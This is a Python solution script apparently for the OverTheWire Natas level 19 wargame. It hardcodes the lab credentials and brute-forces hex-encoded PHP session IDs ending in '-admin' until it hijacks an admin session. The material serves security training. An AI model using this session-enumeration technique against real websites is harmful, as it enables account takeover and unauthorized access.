import requests
import sys

auth_user = 'natas19'
auth_pass = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
target = 'http://natas19.natas.labs.overthewire.org'

def check(id):
	phpsessid = '%s2d61646d696e' % id
	r = requests.get(
		target,
		auth=(auth_user, auth_pass),
		cookies={'PHPSESSID': phpsessid}
		)
	print("[REQUEST] PHPSESSID=%s" % phpsessid)
	if 'You are an admin' in r.text:
		print(r.text)
		sys.exit(0)

# 2 digits ID
print("===== 2 digits ID =====")
for i in range(10):
	id = "3%s" % i
	check(id)

# 3 digits ID
print("===== 3 digits ID =====")
for i in range(10):
	id = "3%s3" % i
	check(id)

# 4 digits ID
print("===== 4 digits ID =====")
for i in range(100):
	id = "3%s3%s" % (str(i).zfill(2)[0:1], str(i).zfill(2)[1:2])
	check(id)

# 5 digits ID
print("===== 5 digits ID =====")
for i in range(100):
	id = "3%s3%s3" % (str(i).zfill(2)[0:1], str(i).zfill(2)[1:2])
	check(id)

# 6 digits ID
print("===== 6 digits ID =====")
for i in range(1000):
	id = "3%s3%s3%s" % (str(i).zfill(3)[0:1], str(i).zfill(3)[1:2], str(i).zfill(3)[2:3])
	check(id)